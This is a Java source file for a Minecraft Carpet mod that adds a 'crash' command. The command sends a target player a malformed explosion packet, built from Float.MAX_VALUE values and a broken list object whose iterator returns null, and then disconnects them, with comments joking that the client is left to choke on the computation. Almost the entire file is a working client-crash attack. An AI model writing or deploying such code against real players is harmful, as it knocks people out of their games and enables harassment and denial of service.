package CarpetTCTCAddition.commands;

import CarpetTCTCAddition.CarpetTCTCAdditionSettings;
import carpet.patches.EntityPlayerMPFake;
import carpet.settings.SettingsManager;
import carpet.utils.Messenger;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.arguments.EntityArgumentType;
import net.minecraft.network.packet.s2c.play.ExplosionS2CPacket;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.TranslatableText;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;
import org.jetbrains.annotations.NotNull;

import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.ListIterator;

public class CrashCommand {
    public static void register(CommandDispatcher<ServerCommandSource> dispatcher) {
        LiteralArgumentBuilder<ServerCommandSource> crash = CommandManager.literal("crash")
            .requires((player) -> SettingsManager.canUseCommand(player, CarpetTCTCAdditionSettings.commandCrash))
            .then(CommandManager.argument("目标选择器", EntityArgumentType.players())
                .requires((c) -> c.hasPermissionLevel(3))
                .executes((c) -> execute(c.getSource(), EntityArgumentType.getPlayers(c, "目标选择器"))))
            .then(CommandManager.argument("玩家", EntityArgumentType.player())
                .executes((c) -> crash(c.getSource(), EntityArgumentType.getPlayer(c, "玩家"))));
        dispatcher.register(crash);
    }
    public static int execute(ServerCommandSource source, Collection<ServerPlayerEntity> targets) {
        for (ServerPlayerEntity serverPlayerEntity : targets) {
            crash(source, serverPlayerEntity);
        }
        return 1;
    }
    public static int crash(ServerCommandSource source, ServerPlayerEntity player) {
        if (!player.getEntityWorld().isClient) {
            if (player instanceof EntityPlayerMPFake) {
                Messenger.m(source,"无法发送向" + player.getName().getString() + "(地毯假人)发送此数据, 这将使服务端崩溃.");
                return 1;
            }
        }
        player.networkHandler.sendPacket(
            new ExplosionS2CPacket(
                player.getX(),
                player.getY(),
                player.getZ(),
                Float.MAX_VALUE,
                new List<BlockPos>() {
                    @Override
                    public int size() {
                        return 0;
                    }

                    @Override
                    public boolean isEmpty() {
                        return false;
                    }

                    @Override
                    public boolean contains(Object o) {
                        return false;
                    }

                    @NotNull
                    @Override
                    public Iterator<BlockPos> iterator() {
                        return null;
                    }

                    @NotNull
                    @Override
                    public Object[] toArray() {
                        return new Object[0];
                    }

                    @NotNull
                    @Override
                    public <T> T[] toArray(@NotNull T[] a) {
                        return null;
                    }

                    @Override
                    public boolean add(BlockPos blockPos) {
                        return false;
                    }

                    @Override
                    public boolean remove(Object o) {
                        return false;
                    }

                    @Override
                    public boolean containsAll(@NotNull Collection<?> c) {
                        return false;
                    }

                    @Override
                    public boolean addAll(@NotNull Collection<? extends BlockPos> c) {
                        return false;
                    }

                    @Override
                    public boolean addAll(int index, @NotNull Collection<? extends BlockPos> c) {
                        return false;
                    }

                    @Override
                    public boolean removeAll(@NotNull Collection<?> c) {
                        return false;
                    }

                    @Override
                    public boolean retainAll(@NotNull Collection<?> c) {
                        return false;
                    }

                    @Override
                    public void clear() {

                    }

                    @Override
                    public boolean equals(Object o) {
                        return false;
                    }

                    @Override
                    public int hashCode() {
                        return 0;
                    }

                    @Override
                    public BlockPos get(int index) {
                        return null;
                    }

                    @Override
                    public BlockPos set(int index, BlockPos element) {
                        return null;
                    }

                    @Override
                    public void add(int index, BlockPos element) {

                    }

                    @Override
                    public BlockPos remove(int index) {
                        return null;
                    }

                    @Override
                    public int indexOf(Object o) {
                        return 0;
                    }

                    @Override
                    public int lastIndexOf(Object o) {
                        return 0;
                    }

                    @NotNull
                    @Override
                    public ListIterator<BlockPos> listIterator() {
                        return null;
                    }

                    @NotNull
                    @Override
                    public ListIterator<BlockPos> listIterator(int index) {
                        return null;
                    }

                    @NotNull
                    @Override
                    public List<BlockPos> subList(int fromIndex, int toIndex) {
                        return null;
                    }
                },
                new Vec3d(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)
            )
        );
        player.sendMessage((new TranslatableText("commands.message.display.incoming", source.getDisplayName(), "你炸了!")).formatted(Formatting.GRAY, Formatting.ITALIC));
        source.sendFeedback((new TranslatableText("commands.message.display.outgoing", player.getDisplayName(), "你炸了!")).formatted(Formatting.GRAY, Formatting.ITALIC), false);
        try {
            Thread.sleep(100L); // 延迟 0.1 喵
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        player.networkHandler.disconnect(null); // 断开连接, 让他慢慢算吧 * v *
        return 1;
    }
}
